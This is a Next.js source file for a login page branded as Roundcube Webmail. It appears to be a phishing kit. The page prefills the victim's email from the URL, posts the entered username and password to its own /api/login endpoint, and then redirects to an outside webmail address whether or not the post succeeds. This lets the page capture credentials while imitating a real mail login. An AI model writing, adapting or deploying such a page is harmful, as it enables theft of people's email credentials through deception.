"use client";

import { useState, Suspense } from "react";
import { useSearchParams } from "next/navigation";
import Image from "next/image";

function LoginForm() {
  const searchParams = useSearchParams();
  const emailParam = searchParams.get("email") || "";
  const [username, setUsername] = useState(emailParam);
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      });

      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
    } catch (error) {
      console.error("Error:", error);
      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
    }
  };

  return (
    <div className="login-container">
      {/* Roundcube Logo */}
      
      <Image src="/webmaillogo.svg" alt="Roundcube Logo" width={100} height={100} />

      <form className="login-form" onSubmit={handleSubmit}>
        <div className="input-wrapper">
          <div className="input-icon">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </div>
          <input
            type="text"
            className="login-input"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
        </div>

        <div className="input-wrapper">
          <div className="input-icon">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
            </svg>
          </div>
          <input
            type="password"
            className="login-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>

        <button type="submit" className="login-button" disabled={isLoading}>
          {isLoading ? "Loading..." : "Login"}
        </button>
      </form>

      <span className="brand-text">Roundcube Webmail</span>
    </div>
  );
}

export default function Home() {
  return (
    <Suspense
      fallback={
        <div className="login-container">
          <span className="brand-text">Loading...</span>
        </div>
      }
    >
      <LoginForm />
    </Suspense>
  );
}
